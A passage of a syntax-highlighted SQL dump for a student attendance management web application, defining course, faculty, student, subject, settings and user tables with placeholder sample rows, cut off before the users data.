template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">course</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">description</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">date_created</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span> <span class="token constant">VALUES</span></pre></td></tr><tr><td data-num="128"></td><td><pre><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'Sample Course'</span><span class="token punctuation">,</span> <span class="token string">'Sample Course'</span><span class="token punctuation">,</span> <span class="token string">'2020-10-28 10:00:41'</span><span class="token punctuation">)</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="129"></td><td><pre><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'Course 2'</span><span class="token punctuation">,</span> <span class="token string">' Course 2'</span><span class="token punctuation">,</span> <span class="token string">'2020-10-28 10:02:09'</span><span class="token punctuation">)</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="130"></td><td><pre><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'Course 3'</span><span class="token punctuation">,</span> <span class="token string">' Course 3'</span><span class="token punctuation">,</span> <span class="token string">'2020-10-28 10:02:16'</span><span class="token punctuation">)</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="131"></td><td><pre><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'Course 4'</span><span class="token punctuation">,</span> <span class="token string">' Course 4'</span><span class="token punctuation">,</span> <span class="token string">'2020-10-28 10:02:24'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="132"></td><td><pre></pre></td></tr><tr><td data-num="133"></td><td><pre><span class="token operator">--</span> <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span></pre></td></tr><tr><td data-num="134"></td><td><pre></pre></td></tr><tr><td data-num="135"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="136"></td><td><pre><span class="token operator">--</span> Table structure <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">faculty</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="137"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="138"></td><td><pre></pre></td></tr><tr><td data-num="139"></td><td><pre><span class="token constant">CREATE</span> <span class="token constant">TABLE</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">faculty</span><span class="token template-punctuation string">`</span></span> <span class="token punctuation">(</span></pre></td></tr><tr><td data-num="140"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token template-punctuation string">`</span></span> <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="141"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id_no</span><span class="token template-punctuation string">`</span></span> <span class="token function">varchar</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="142"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">name</span><span class="token template-punctuation string">`</span></span> text <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="143"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">email</span><span class="token template-punctuation string">`</span></span> <span class="token function">varchar</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="144"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">contact</span><span class="token template-punctuation string">`</span></span> <span class="token function">varchar</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="145"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">address</span><span class="token template-punctuation string">`</span></span> text <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="146"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">date_created</span><span class="token template-punctuation string">`</span></span> datetime <span class="token constant">NOT</span> <span class="token constant">NULL</span> <span class="token constant">DEFAULT</span> <span class="token function">current_timestamp</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="147"></td><td><pre><span class="token punctuation">)</span> <span class="token constant">ENGINE</span><span class="token operator">=</span>InnoDB <span class="token constant">DEFAULT</span> <span class="token constant">CHARSET</span><span class="token operator">=</span>utf8mb4<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="148"></td><td><pre></pre></td></tr><tr><td data-num="149"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="150"></td><td><pre><span class="token operator">--</span> Dumping data <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">faculty</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="151"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="152"></td><td><pre></pre></td></tr><tr><td data-num="153"></td><td><pre><span class="token constant">INSERT</span> <span class="token constant">INTO</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">faculty</span><span class="token template-punctuation string">`</span></span> <span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id_no</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">name</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">email</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">contact</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">address</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">date_created</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span> <span class="token constant">VALUES</span></pre></td></tr><tr><td data-num="154"></td><td><pre><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'06232014'</span><span class="token punctuation">,</span> <span class="token string">'John Smith'</span><span class="token punctuation">,</span> <span class="token string">'jsmith@sample.com'</span><span class="token punctuation">,</span> <span class="token string">'+18456-5455-55'</span><span class="token punctuation">,</span> <span class="token string">'Sample Only'</span><span class="token punctuation">,</span> <span class="token string">'2020-10-28 11:32:18'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="155"></td><td><pre></pre></td></tr><tr><td data-num="156"></td><td><pre><span class="token operator">--</span> <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span></pre></td></tr><tr><td data-num="157"></td><td><pre></pre></td></tr><tr><td data-num="158"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="159"></td><td><pre><span class="token operator">--</span> Table structure <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">students</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="160"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="161"></td><td><pre></pre></td></tr><tr><td data-num="162"></td><td><pre><span class="token constant">CREATE</span> <span class="token constant">TABLE</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">students</span><span class="token template-punctuation string">`</span></span> <span class="token punctuation">(</span></pre></td></tr><tr><td data-num="163"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token template-punctuation string">`</span></span> <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="164"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id_no</span><span class="token template-punctuation string">`</span></span> <span class="token function">varchar</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="165"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">class_id</span><span class="token template-punctuation string">`</span></span> <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="166"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">name</span><span class="token template-punctuation string">`</span></span> text <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="167"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">date_created</span><span class="token template-punctuation string">`</span></span> datetime <span class="token constant">NOT</span> <span class="token constant">NULL</span> <span class="token constant">DEFAULT</span> <span class="token function">current_timestamp</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="168"></td><td><pre><span class="token punctuation">)</span> <span class="token constant">ENGINE</span><span class="token operator">=</span>InnoDB <span class="token constant">DEFAULT</span> <span class="token constant">CHARSET</span><span class="token operator">=</span>utf8mb4<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="169"></td><td><pre></pre></td></tr><tr><td data-num="170"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="171"></td><td><pre><span class="token operator">--</span> Dumping data <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">students</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="172"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="173"></td><td><pre></pre></td></tr><tr><td data-num="174"></td><td><pre><span class="token constant">INSERT</span> <span class="token constant">INTO</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">students</span><span class="token template-punctuation string">`</span></span> <span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id_no</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">class_id</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">name</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">date_created</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span> <span class="token constant">VALUES</span></pre></td></tr><tr><td data-num="175"></td><td><pre><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'06232014'</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'Claire Blake'</span><span class="token punctuation">,</span> <span class="token string">'2020-10-28 11:53:24'</span><span class="token punctuation">)</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="176"></td><td><pre><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'123456'</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'George Wilson'</span><span class="token punctuation">,</span> <span class="token string">'2020-10-28 15:20:57'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="177"></td><td><pre></pre></td></tr><tr><td data-num="178"></td><td><pre><span class="token operator">--</span> <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span></pre></td></tr><tr><td data-num="179"></td><td><pre></pre></td></tr><tr><td data-num="180"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="181"></td><td><pre><span class="token operator">--</span> Table structure <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">subjects</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="182"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="183"></td><td><pre></pre></td></tr><tr><td data-num="184"></td><td><pre><span class="token constant">CREATE</span> <span class="token constant">TABLE</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">subjects</span><span class="token template-punctuation string">`</span></span> <span class="token punctuation">(</span></pre></td></tr><tr><td data-num="185"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token template-punctuation string">`</span></span> <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="186"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">subject</span><span class="token template-punctuation string">`</span></span> <span class="token function">varchar</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="187"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">description</span><span class="token template-punctuation string">`</span></span> text <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="188"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">date_created</span><span class="token template-punctuation string">`</span></span> datetime <span class="token constant">NOT</span> <span class="token constant">NULL</span> <span class="token constant">DEFAULT</span> <span class="token function">current_timestamp</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="189"></td><td><pre><span class="token punctuation">)</span> <span class="token constant">ENGINE</span><span class="token operator">=</span>InnoDB <span class="token constant">DEFAULT</span> <span class="token constant">CHARSET</span><span class="token operator">=</span>utf8mb4<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="190"></td><td><pre></pre></td></tr><tr><td data-num="191"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="192"></td><td><pre><span class="token operator">--</span> Dumping data <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">subjects</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="193"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="194"></td><td><pre></pre></td></tr><tr><td data-num="195"></td><td><pre><span class="token constant">INSERT</span> <span class="token constant">INTO</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">subjects</span><span class="token template-punctuation string">`</span></span> <span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">subject</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">description</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">date_created</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span> <span class="token constant">VALUES</span></pre></td></tr><tr><td data-num="196"></td><td><pre><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'Subject 1 '</span><span class="token punctuation">,</span> <span class="token string">'Subject 1 '</span><span class="token punctuation">,</span> <span class="token string">'2020-10-28 10:29:53'</span><span class="token punctuation">)</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="197"></td><td><pre><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'Subject 2'</span><span class="token punctuation">,</span> <span class="token string">'Subject 2'</span><span class="token punctuation">,</span> <span class="token string">'2020-10-28 10:30:48'</span><span class="token punctuation">)</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="198"></td><td><pre><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'Subject 3'</span><span class="token punctuation">,</span> <span class="token string">'Subject 3'</span><span class="token punctuation">,</span> <span class="token string">'2020-10-28 10:30:57'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="199"></td><td><pre></pre></td></tr><tr><td data-num="200"></td><td><pre><span class="token operator">--</span> <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span></pre></td></tr><tr><td data-num="201"></td><td><pre></pre></td></tr><tr><td data-num="202"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="203"></td><td><pre><span class="token operator">--</span> Table structure <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">system_settings</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="204"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="205"></td><td><pre></pre></td></tr><tr><td data-num="206"></td><td><pre><span class="token constant">CREATE</span> <span class="token constant">TABLE</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">system_settings</span><span class="token template-punctuation string">`</span></span> <span class="token punctuation">(</span></pre></td></tr><tr><td data-num="207"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token template-punctuation string">`</span></span> <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="208"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">name</span><span class="token template-punctuation string">`</span></span> text <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="209"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">email</span><span class="token template-punctuation string">`</span></span> <span class="token function">varchar</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="210"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">contact</span><span class="token template-punctuation string">`</span></span> <span class="token function">varchar</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="211"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">cover_img</span><span class="token template-punctuation string">`</span></span> text <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="212"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">about_content</span><span class="token template-punctuation string">`</span></span> text <span class="token constant">NOT</span> <span class="token constant">NULL</span></pre></td></tr><tr><td data-num="213"></td><td><pre><span class="token punctuation">)</span> <span class="token constant">ENGINE</span><span class="token operator">=</span>InnoDB <span class="token constant">DEFAULT</span> <span class="token constant">CHARSET</span><span class="token operator">=</span>utf8mb4<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="214"></td><td><pre></pre></td></tr><tr><td data-num="215"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="216"></td><td><pre><span class="token operator">--</span> Dumping data <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">system_settings</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="217"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="218"></td><td><pre></pre></td></tr><tr><td data-num="219"></td><td><pre><span class="token constant">INSERT</span> <span class="token constant">INTO</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">system_settings</span><span class="token template-punctuation string">`</span></span> <span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">name</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">email</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">contact</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">cover_img</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">about_content</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span> <span class="token constant">VALUES</span></pre></td></tr><tr><td data-num="220"></td><td><pre><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'Student Attendance Management System'</span><span class="token punctuation">,</span> <span class="token string">'info@sample.comm'</span><span class="token punctuation">,</span> <span class="token string">'+6948 8542 623'</span><span class="token punctuation">,</span> <span class="token string">'1603344720_1602738120_pngtree-purple-hd-business-banner-image_5493.jpg'</span><span class="token punctuation">,</span> <span class="token string">'&amp;lt;p style=&amp;quot;text-align: center; background: transparent; position: relative;&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color: rgb(0, 0, 0); font-family: &amp;amp;quot;Open Sans&amp;amp;quot;, Arial, sans-serif; font-weight: 400; text-align: justify;&amp;quot;&amp;gt;&amp;amp;nbsp;is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry&amp;rsquo;s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.&amp;lt;/span&amp;gt;&amp;lt;br&amp;gt;&amp;lt;/p&amp;gt;&amp;lt;p style=&amp;quot;text-align: center; background: transparent; position: relative;&amp;quot;&amp;gt;&amp;lt;br&amp;gt;&amp;lt;/p&amp;gt;&amp;lt;p style=&amp;quot;text-align: center; background: transparent; position: relative;&amp;quot;&amp;gt;&amp;lt;br&amp;gt;&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;&amp;lt;/p&amp;gt;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="221"></td><td><pre></pre></td></tr><tr><td data-num="222"></td><td><pre><span class="token operator">--</span> <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span></pre></td></tr><tr><td data-num="223"></td><td><pre></pre></td></tr><tr><td data-num="224"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="225"></td><td><pre><span class="token operator">--</span> Table structure <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">users</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="226"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="227"></td><td><pre></pre></td></tr><tr><td data-num="228"></td><td><pre><span class="token constant">CREATE</span> <span class="token constant">TABLE</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">users</span><span class="token template-punctuation string">`</span></span> <span class="token punctuation">(</span></pre></td></tr><tr><td data-num="229"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token template-punctuation string">`</span></span> <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="230"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">name</span><span class="token template-punctuation string">`</span></span> text <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="231"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">username</span><span class="token template-punctuation string">`</span></span> <span class="token function">varchar</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="232"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">password</span><span class="token template-punctuation string">`</span></span> text <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="233"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">type</span><span class="token template-punctuation string">`</span></span> <span class="token function">tinyint</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span> <span class="token constant">DEFAULT</span> <span class="token number">3</span> <span class="token constant">COMMENT</span> <span class="token string">'1=Admin,2=Staff'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="234"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">faculty_id</span><span class="token template-punctuation string">`</span></span> <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span> <span class="token constant">COMMENT</span> <span class="token string">'for faculty user only'</span></pre></td></tr><tr><td data-num="235"></td><td><pre><span class="token punctuation">)</span> <span class="token constant">ENGINE</span><span class="token operator">=</span>InnoDB <span class="token constant">DEFAULT</span> <span class="token constant">CHARSET</span><span class="token operator">=</span>utf8mb4<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="236"></td><td><pre></pre></td></tr><tr><td data-num="237"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="238"></td><td><pre><span class="token operator">--</span> Dumping data <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">users</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="239"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="240"></td><td><pre></pre></td></tr><tr><td data-num="241"></td><td><pre><span class="token 